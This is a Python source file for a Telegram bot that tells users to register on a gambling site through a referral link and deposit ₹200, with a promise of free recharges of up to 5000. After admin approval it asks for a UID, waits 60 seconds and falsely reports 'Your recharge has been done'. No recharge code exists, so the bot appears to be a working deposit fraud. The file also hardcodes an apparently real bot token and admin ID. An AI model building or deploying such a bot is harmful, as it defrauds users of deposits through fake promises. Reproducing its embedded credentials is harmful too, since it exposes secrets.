import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import time

# Replace with your bot token
BOT_TOKEN = "7544954161:AAHyFIjtK3w6K6IMx2IzjAzAICYiZVGMwsQ"
ADMIN_ID = 6729629543  # Replace with your Telegram ID

bot = telebot.TeleBot(BOT_TOKEN)

# Dictionary to track user states (for UID input)
user_state = {}

# Start Command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    rules_text = """🔴IMPORTANT RULES🔴
    
1️⃣. Must Register This Link - https://www.jalwa.fun/#/register?invitationCode=28462164684

2️⃣. Deposit ₹200 Must For Approval

3️⃣. After Deposit Send Jalwa Game Profile screenshot For Approval

4️⃣. After Send Screenshot Wait 1-2 Hour For Admin Approval.
"""
    bot.send_message(message.chat.id, rules_text)

# Handle Screenshot Submission
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    if message.chat.id == ADMIN_ID:
        return  # Ignore screenshots from the admin
        
    # Forward screenshot to admin
    forwarded_message = bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    
    # Add Approve/Reject buttons
    markup = InlineKeyboardMarkup()
    approve_button = InlineKeyboardButton("✅ Approve", callback_data=f"approve_{message.chat.id}")
    reject_button = InlineKeyboardButton("❌ Reject", callback_data=f"reject_{message.chat.id}")
    markup.add(approve_button, reject_button)
    
    bot.send_message(ADMIN_ID, "Verify this screenshot:", reply_markup=markup)
    bot.send_message(message.chat.id, "Your screenshot has been submitted for admin verification. Please wait for approval.")

# Handle Admin Actions
@bot.callback_query_handler(func=lambda call: call.data.startswith("approve_") or call.data.startswith("reject_"))
def handle_verification(call):
    user_id = int(call.data.split("_")[1])
    
    if call.data.startswith("approve"):
        # Send Recharge Options
        markup = InlineKeyboardMarkup()
        for amount in ["100", "500", "1000", "5000"]:
            markup.add(InlineKeyboardButton(f"{amount} Recharge Free", callback_data=f"recharge_{user_id}_{amount}"))
        
        bot.send_message(user_id, "Your verification has been approved! Choose a recharge option:", reply_markup=markup)
        bot.send_message(ADMIN_ID, "User approved.")
    else:
        bot.send_message(user_id, "Your verification has been rejected. Please check the requirements.")
        bot.send_message(ADMIN_ID, "User rejected.")

    bot.answer_callback_query(call.id)

# Handle Recharge Option
@bot.callback_query_handler(func=lambda call: call.data.startswith("recharge_"))
def handle_recharge(call):
    _, user_id, amount = call.data.split("_")
    user_id = int(user_id)
    
    bot.send_message(user_id, "Send Your UID")
    user_state[user_id] = "awaiting_uid"

# Handle UID Submission
@bot.message_handler(func=lambda message: message.chat.id in user_state and user_state[message.chat.id] == "awaiting_uid")
def handle_uid(message):
    if len(message.text) == 6 and message.text.isdigit():
        bot.send_message(message.chat.id, "Processing your recharge, please wait...")
        time.sleep(60)  # Simulate delay
        bot.send_message(message.chat.id, "Your recharge has been done ✅")
        del user_state[message.chat.id]  # Reset user state
    else:
        bot.send_message(message.chat.id, "Invalid UID! Please send a 6-digit number.")

# Run the bot
print("Bot is running...")
bot.polling()